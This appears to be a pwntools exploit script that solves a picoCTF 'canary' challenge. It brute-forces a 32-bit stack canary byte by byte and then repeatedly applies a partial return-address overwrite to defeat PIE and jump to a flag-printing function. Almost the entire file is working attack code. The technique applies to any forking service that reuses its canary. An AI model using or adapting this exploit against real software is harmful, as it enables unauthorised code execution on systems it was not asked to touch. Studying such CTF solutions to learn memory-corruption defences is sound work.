#!/usr/bin/env python
from pwn import *

# set up enviroment
DEBUG = False
ARCH = 32
ADDR_SIZE = ARCH/8
BIN_FILE = './vuln'
# BIN_FILE = '/problems/canary_3_257a2a2061c96a7fb8326dbbc04d0328/vuln'

if ARCH == 64:
	context(arch='amd64', os='linux', log_level='error')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elif ARCH == 32:
	context(arch='i386', os='linux', log_level='error')
	if DEBUG:
		libc = ELF('/lib/i386-linux-gnu/libc.so.6')
	else:
		libc = ELF('/lib32/libc.so.6')

bin = ELF(BIN_FILE)

# offsets
bof_off = 0x30  # offset of buf, away from ebp
canary_off = 0x10 # offset of canary, away from ebp
bof_canary = bof_off - canary_off # offset of canary, away from buf
canary_size = ADDR_SIZE


# brute-force canary
canary = ''
print('Brute-force CANARY: ...')
for i in range(1, canary_size+1):
  for e in range(256):
    r = process(BIN_FILE)
    r.sendlineafter('> ', str(bof_canary+i))
    r.sendafter('> ', 'a'*bof_canary+canary+chr(e))
    output = r.recvall()
    if 'Stack' not in output:
      print canary
      canary += chr(e)
      break
print('\nCANARY: {}'.format(canary))
print('\nBrute-force PIE: ...')

# canary = '57Gh'

# brute-force PIE to ret2func
payload = 'a'*bof_canary+canary+'b'*(canary_off-canary_size)+'c'*4+'\xed\x07'
length = len(payload)
while True:
	r = process(BIN_FILE)
	r.sendlineafter('> ', str(length))
	r.sendlineafter('> ', payload)
	p = str(r.recv().split('\n')[1])
	if p[:7] == 'picoCTF':
		r.close()
		print('\n'+p)
		break
	r.close()
# r.interactive()